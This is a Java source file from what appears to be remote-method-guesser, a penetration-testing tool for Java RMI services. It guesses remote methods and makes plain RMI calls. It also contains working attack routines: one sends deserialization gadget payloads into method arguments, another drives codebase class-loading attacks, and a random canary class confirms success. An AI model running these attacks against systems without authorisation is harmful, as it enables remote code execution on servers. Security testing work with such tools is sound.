package de.qtc.rmg.operations;

import java.rmi.server.ObjID;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;

import org.springframework.remoting.support.RemoteInvocation;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.internal.MethodArguments;
import de.qtc.rmg.internal.MethodCandidate;
import de.qtc.rmg.internal.RMGOption;
import de.qtc.rmg.internal.RMIComponent;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.networking.RMIEndpoint;
import de.qtc.rmg.networking.RMIRegistryEndpoint;
import de.qtc.rmg.utils.DefinitelyNonExistingClass;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.SpringRemotingWrapper;
import de.qtc.rmg.utils.UnicastWrapper;
import javassist.CannotCompileException;
import javassist.CtClass;
import javassist.NotFoundException;
import sun.rmi.server.UnicastRef;


/**
 * The RemoteObjectClient class is used for method guessing and communication to user defined remote objects.
 * It can be used to perform regular RMI calls to objects specified by either a bound name or an ObjID.
 * Apart from regular RMI calls, it also supports invoking methods with payload objects and user specified codebases.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
@SuppressWarnings("restriction")
public class RemoteObjectClient
{
    private ObjID objID;
    private UnicastRef remoteRef;

    private RMIEndpoint rmi;

    private String boundName;
    private String randomClassName;

    public UnicastWrapper remoteObject;
    public List<MethodCandidate> remoteMethods;

    /**
     * The RemoteObjectClient makes use of an RMIRegistryEndpoint to obtain a RemoteObject reference from the RMI
     * registry. Afterwards, it needs access to the underlying UnicastRemoteRef to perform low level RMI calls.
     *
     * @param rmiRegistry RMIRegistryEndpoint to perform lookup operations
     * @param boundName for the lookup on the RMI registry
     */
    public RemoteObjectClient(RMIRegistryEndpoint rmiRegistry, String boundName)
    {
        this.objID = null;
        this.rmi = rmiRegistry;
        this.boundName = boundName;
        this.remoteMethods = Collections.synchronizedList(new ArrayList<MethodCandidate>());

        remoteRef = getRemoteRefByName();
    }

    /**
     * When the ObjID of a remote object is already known, we can talk to this object without a previous lookup
     * operation. In this case, the corresponding remote reference is constructed from scratch, as the ObjID and
     * the target address (host:port) are the only required information.
     *
     * @param rmiEndpoint RMIEndpoint that represents the server where the object is located
     * @param objID ObjID of the remote object to talk to
     */
    public RemoteObjectClient(RMIEndpoint rmiEndpoint, ObjID objID)
    {
        this.rmi = rmiEndpoint;
        this.objID = objID;
        this.remoteMethods = Collections.synchronizedList(new ArrayList<MethodCandidate>());

        this.remoteRef = getRemoteRefByObjID();
    }

    /**
     * If you already obtained a reference to the remote object, you can also use it directly
     * in form of passing an UnicastWrapper.
     *
     * @param remoteObject Previously obtained remote reference contained in a UnicastWrapper
     */
    public RemoteObjectClient(UnicastWrapper remoteObject)
    {
        this.rmi = new RMIEndpoint(remoteObject.getHost(), remoteObject.getPort(), remoteObject.csf);
        this.objID = remoteObject.objID;
        this.boundName = remoteObject.boundName;
        this.remoteObject = remoteObject;
        this.remoteMethods = Collections.synchronizedList(new ArrayList<MethodCandidate>());

        remoteRef = remoteObject.unicastRef;
    }

    /**
     * When a RemoteObjectClient was obtained using an ObjID, it has no assigned UnicastWrapper.
     * remote-method-guesser only creates a UnicastRef using the endpoint information and the ObjID,
     * which is sufficient for RMI calls. Constructing a RemoteObject from a UnicastRef is easily
     * possible, but it is only useful when also the implemented remote interface is known.
     *
     * This functions creates a UnicastWrapper (RemoteObject) that is based on the already
     * constructed UnicastRef and implements the specified interface.
     *
     * @param intf Interface implemented by the RemoteObject
     */
    public UnicastWrapper assignInterface(Class<?> intf)
    {
        UnicastWrapper remoteObject = null;

        try
        {
            remoteObject = UnicastWrapper.fromRef(remoteRef, intf);
            this.remoteObject = remoteObject;
        }

        catch (IllegalArgumentException | IllegalAccessException | NoSuchFieldException | SecurityException e)
        {
            ExceptionHandler.internalError("RemoteObjectClient.assignInterface", "Caught unexpected exception: " + e.getClass().getName());
        }

        return remoteObject;
    }

    /**
     * Adds a successfully guessed MethodCandidate to the client's method list.
     *
     * @param candidate Successfully guessed method candidate
     */
    public void addRemoteMethod(MethodCandidate candidate)
    {
        this.remoteMethods.add(candidate);
    }

    /**
     * Adds a list of successfully guessed MethodCandidates to the client's method list.
     *
     * @param candidates Successfully guessed method candidates
     */
    public void addRemoteMethods(List<MethodCandidate> candidates)
    {
        this.remoteMethods.addAll(candidates);
    }

    /**
     * Getter function for the bound name.
     *
     * @return bound name associated with the RemoteObjectClient
     */
    public String getBoundName()
    {
        return this.boundName;
    }

    /**
     * Gets a list of bound names associated with the RemoteObjectClient itself and
     * all of its duplicates.
     *
     * @return bound name associated with the RemoteObjectClient
     */
    public String[] getBoundNames()
    {
        int boundNamesSize = remoteObject.duplicates.size();

        String[] boundNames = new String[boundNamesSize + 1];
        boundNames[0] = this.boundName;

        for(int ctr = 0; ctr < boundNamesSize; ctr++)
        {
            boundNames[ctr + 1] = remoteObject.duplicates.get(ctr).boundName;
        }

        return boundNames;
    }

    /**
     * Invokes the specified MethodCandiate with a user specified payload object. This is used during deserialization
     * attacks and needs to target non primitive input arguments of RMI methods. By default, the function attempts
     * to find a non primitive method argument on its own. However, by using the argumentPosition parameter, it is
     * also possible to specify it manually.
     *
     * @param targetMethod method to target for the attack
     * @param gadget payload object to use for the call
     * @param argumentPosition argument position to attack. Can be negative for auto selection.
     */
    public void gadgetCall(MethodCandidate targetMethod, Object gadget, int argumentPosition)
    {
        int attackArgument = findNonPrimitiveArgument(targetMethod, argumentPosition);

        Logger.printGadgetCallIntro("RMI");
        printGadgetIntro(targetMethod, attackArgument);

        MethodArguments argumentArray = prepareArgumentArray(targetMethod, gadget, attackArgument);

        try
        {
            rmi.genericCall(null, -1, targetMethod.getHash(), argumentArray, false, getMethodName(targetMethod), remoteRef);

            Logger.eprintln("Remote method invocation didn't cause any exception.");
            Logger.eprintln("This is unusual and the attack probably didn't work.");
        }

        catch (Exception e)
        {
            Throwable cause = ExceptionHandler.getCause(e);

            if (cause instanceof java.rmi.UnmarshalException && cause.getMessage().contains("unrecognized method hash"))
            {
                Logger.eprintlnMixedYellow("Method", targetMethod.getSignature(), "does not exist on this remote object.");
                ExceptionHandler.showStackTrace(e);
            }

            else
            {
                ExceptionHandler.handleGadgetCallException(e, RMIComponent.CUSTOM, "method", randomClassName);
            }
        }
    }

    /**
     * This function invokes the specified MethodCandidate with a user specified codebase. The specified payload object
     * is expected to be an instance of the class that should be loaded from the codebase. Usually this is created
     * dynamically by rmg and the user has only to specify the class name. The function needs to target a non primitive
     * method argument, that is selected by default, but users can also specify an argumentPosition explicitly.
     *
     * @param targetMethod method to target for the attack
     * @param gadget instance of class that should be loaded from the client specified codebase
     * @param argumentPosition argument to use for the attack. Can be negative for auto selection
     */
    public void codebaseCall(MethodCandidate targetMethod, Object gadget, int argumentPosition)
    {
        int attackArgument = findNonPrimitiveArgument(targetMethod, argumentPosition);
        String methodName = getMethodName(targetMethod);

        Logger.printCodebaseAttackIntro("RMI", methodName, gadget.getClass().getName());
        printGadgetIntro(targetMethod, attackArgument);

        MethodArguments argumentArray = prepareArgumentArray(targetMethod, gadget, attackArgument);

        try
        {
            rmi.genericCall(null, -1, targetMethod.getHash(), argumentArray, true, methodName, remoteRef);

            Logger.eprintln("Remote method invocation didn't cause any exception.");
            Logger.eprintln("This is unusual and the attack probably didn't work.");
        }

        catch (Exception e)
        {
            Throwable cause = ExceptionHandler.getCause(e);

            if (cause instanceof java.rmi.UnmarshalException && cause.getMessage().contains("unrecognized method hash"))
            {
                Logger.eprintlnMixedYellow("Method", targetMethod.getSignature(), "does not exist on this remote object.");
                ExceptionHandler.showStackTrace(e);
            }

            else
            {
                ExceptionHandler.handleCodebaseException(e, gadget.getClass().getName(), RMIComponent.CUSTOM, "method", randomClassName);
            }
        }
    }

    /**
     * This function is used for regular RMI calls on the specified MethodCandidate. It takes an array of Objects as
     * input arguments and invokes the MethodCandidate with them accordingly. The function itself is basically just a
     * wrapper around the genericCall function of the RMIEndpoint class. Especially the transformation from the raw
     * Object array into the MethodArguments type is one of its purposes.
     *
     * @param targetMethod remote method to call
     * @param argumentArray method arguments to use for the call
     */
    public void genericCall(MethodCandidate targetMethod, Object[] argumentArray)
    {
        if (remoteObject instanceof SpringRemotingWrapper && ((SpringRemotingWrapper)remoteObject).isRemotingCall(targetMethod))
        {
            argumentArray = new Object[] { SpringRemotingWrapper.buildRemoteInvocation(targetMethod, argumentArray) };
            targetMethod = SpringRemotingWrapper.getInvokeMethod();
        }

        CtClass rtype = null;
        MethodArguments callArguemnts = null;

        try
        {
            rtype = targetMethod.getMethod().getReturnType();
            callArguemnts = RMGUtils.applyParameterTypes(targetMethod.getMethod(), argumentArray);
        }

        catch (Exception e)
        {
            ExceptionHandler.unexpectedException(e, "preparation", "of remote method call", true);
        }

        try
        {
            rmi.genericCall(null, -1, targetMethod.getHash(), callArguemnts, false, getMethodName(targetMethod), remoteRef, rtype);
        }

        catch (java.rmi.ServerException e)
        {
            Throwable cause = ExceptionHandler.getCause(e);

            if (cause instanceof java.rmi.UnmarshalException && e.getMessage().contains("unrecognized method hash"))
            {
                ExceptionHandler.unrecognizedMethodHash(e, "call", targetMethod.getSignature());
            }

            else if (cause instanceof java.io.InvalidClassException)
            {
                ExceptionHandler.invalidClass(e, "RMI endpoint");
            }

            else if (cause instanceof java.lang.UnsupportedOperationException)
            {
                ExceptionHandler.unsupportedOperationException(e, "method");
            }

            else
            {
                ExceptionHandler.unexpectedException(e, "generic call", "operation", false);
            }
        }

        catch (java.rmi.NoSuchObjectException e)
        {
            ExceptionHandler.noSuchObjectException(e, this.objID, true);
        }

        catch (Exception e)
        {
            ExceptionHandler.genericCall(e);
        }
    }


    public void guessingCallSpring(MethodCandidate targetMethod) throws Exception
    {
        RemoteInvocation invo = SpringRemotingWrapper.buildRemoteInvocation(targetMethod, new Object[] {});

        MethodArguments args = new MethodArguments(invo, RemoteInvocation.class);
        targetMethod = SpringRemotingWrapper.getInvokeMethod();

        rmi.genericCall(null, -1, SpringRemotingWrapper.getInvokeMethod().getHash(), args, false, "Invoke", remoteRef, null);
    }

    /**
     * Just a wrapper around the guessingCall function of the RMIEndpoint class.
     *
     * @param targetMethod method to invoke
     * @throws Exception this function is used e.g. for remote method guessing and raising all kind of exceptions is
     *         required.
     */
    public void guessingCall(MethodCandidate targetMethod) throws Exception
    {
        rmi.guessingCall(targetMethod, getMethodName(targetMethod), remoteRef);
    }

    /**
     * Takes a list of RemoteObjectClients and filters clients that have no methods within
     * their method list.
     *
     * @param clientList List of RemoteObjectClients to filter
     * @return List of RemoteObjectClients that contain methods
     */
    public static List<RemoteObjectClient> filterEmpty(List<RemoteObjectClient> clientList)
    {
        Iterator<RemoteObjectClient> it = clientList.iterator();

        while (it.hasNext())
        {
            if (it.next().remoteMethods.isEmpty())
            {
                it.remove();
            }
        }

        return clientList;
    }

    /**
     * Helper function that is used during deserialization and codebase attacks. It prints information on the selected
     * argument position for the attack and also displays the parsed method signature again.
     *
     * @param targetMethod MethodCandidate that is attacked
     * @param attackArgument the argument position of the argument that is attacked
     */
    private void printGadgetIntro(MethodCandidate targetMethod, int attackArgument)
    {
        Logger.printMixedBlue("Using non primitive argument type", targetMethod.getArgumentTypeName(attackArgument));
        Logger.printlnPlainMixedBlue(" on position", String.valueOf(attackArgument));
        Logger.printlnMixedYellow("Specified method signature is", targetMethod.getSignature());

        Logger.lineBreak();
    }

    /**
     * Returns a remote reference created by using the objID value contained within the object.
     *
     * @return Remote reference to the target object
     */
    private UnicastRef getRemoteRefByObjID()
    {
        if (objID == null)
        {
            ExceptionHandler.internalError("getRemoteRefByObjID", "Function was called with missing objID.");
        }

        return rmi.getRemoteRef(objID);
    }

    /**
     * This function obtains a remote reference by using the regular lookup way. It looks up the bound name that was
     * specified during construction of the RemoteObjectClient to obtain the corresponding object from the registry.
     * Reflection is then used to make the remote reference accessible.
     *
     * @return Remote reference to the target object
     */
    private UnicastRef getRemoteRefByName()
    {
        if (boundName == null || !(rmi instanceof RMIRegistryEndpoint))
        {
            ExceptionHandler.internalError("getRemoteRefByName", "Function was called without the required fields.");
        }

        RMIRegistryEndpoint rmiReg = (RMIRegistryEndpoint)rmi;

        try
        {
            remoteObject = rmiReg.lookup(boundName).getUnicastWrapper();
        }

        catch (Exception e)
        {
            ExceptionHandler.unexpectedException(e, "remote reference lookup", "operation", true);
        }

        return remoteObject.unicastRef;
    }

    /**
     * Helper function to find the first non primitive argument within a method or to check whether the
     * user specified argument position is really a non primitive. Basically relies on getPrimitive from
     * the MethodCandidate class. The function itself is mainly concerned on the error handling.
     *
     * @param targetMethod MethodCandidate to look for non primitives
     * @param position user specified argument position
     * @return position of the first non primitive argument or the user specified position if primitive
     */
    private int findNonPrimitiveArgument(MethodCandidate targetMethod, int position)
    {
        int attackArgument = 0;

        try
        {
            attackArgument = targetMethod.getPrimitive(position);
        }

        catch (CannotCompileException | NotFoundException e)
        {
            ExceptionHandler.unexpectedException(e, "search", "for primitive types", true);
        }

        if (attackArgument == -1)
        {
            if (position == -1)
            {
                Logger.eprintlnMixedYellow("No non primitive arguments were found for method signature", targetMethod.getSignature());
            }

            RMGUtils.exit();
        }

        return attackArgument;
    }

    /**
     * During deserialization and codebase attacks, rmg uses a canary to check whether the attack was successful.
     * Instead of sending the plain payload object to the RMI endpoint, rmg always sends an Object array that consists
     * out of the actual payload Object and a canary class. The canary class is randomly generated during runtime and
     * passed in the second position within the Object array. The payload itself is used in the first position.
     *
     * Only if the payload object was successfully processed on the RMI server, it will attempt to load the canary class,
     * that leads to a ClassNotFoundException. This makes it reliably detectable whether an attack was successful.
     *
     * @param targetMethod MethodCandidate to create the payload for.
     * @param gadget payload object to use in the payload
     * @param attackArgument position of a non primitive argument
     * @return MethodArguments to use for the call
     */
    @SuppressWarnings("deprecation")
    private MethodArguments prepareArgumentArray(MethodCandidate targetMethod, Object gadget, int attackArgument)
    {
        Object[] methodArguments = null;

        try
        {
            methodArguments = RMGUtils.getArgumentArray(targetMethod.getMethod());
        }

        catch (Exception e)
        {
            ExceptionHandler.unexpectedException(e, "argument array", "construction", true);
        }

        if (RMGOption.NO_CANARY.getBool())
        {
            methodArguments[attackArgument] = gadget;
        }

        else
        {
            Object[] payloadArray = new Object[2];
            Object randomInstance = null;

            try
            {
                Class<?> randomClass = RMGUtils.makeRandomClass();
                randomInstance = randomClass.newInstance();
            }

            catch (Exception e)
            {
                randomInstance = new DefinitelyNonExistingClass();
            }

            this.randomClassName = randomInstance.getClass().getName();

            payloadArray[0] = gadget;
            payloadArray[1] = randomInstance;
            methodArguments[attackArgument] = payloadArray;
        }

        MethodArguments callArguments = null;

        try
        {
            callArguments = RMGUtils.applyParameterTypes(targetMethod.getMethod(), methodArguments);
        }

        catch (Exception e)
        {
            ExceptionHandler.unexpectedException(e, "parameter types", "mapping", true);
        }

        return callArguments;
    }

    /**
     * Due to other internal requirements, the getName function of the MethodCandidate class does not
     * implement exception handling. Therefore, this function provides a simple wrapper class that catches
     * exceptions.
     *
     * @param targetMethod MethodCandidate to obtain the name from
     * @return method name of the MethodCandidate
     */
    private String getMethodName(MethodCandidate targetMethod)
    {
        String methodName = "";

        try
        {
            methodName = targetMethod.getName();
        }

        catch (CannotCompileException | NotFoundException e)
        {
            ExceptionHandler.unexpectedException(e, "compilation", "process", true);
        }

        return methodName;
    }

    /**
     * Returns the string representation of an RemoteObjectClient. The format is host:port:identifier,
     * where the identifier is either the bound name or the ObjID associated with the RemoteObjectClient.
     *
     * @return String representation of the RemoteObjectClient
     */
    public String toString()
    {
        String identifier = this.objID == null ? this.boundName : this.objID.toString();

        if (identifier == null)
        {
            identifier = "";
        }

        return String.format("%s:%d:%s", rmi.host, rmi.port, identifier);
    }
}
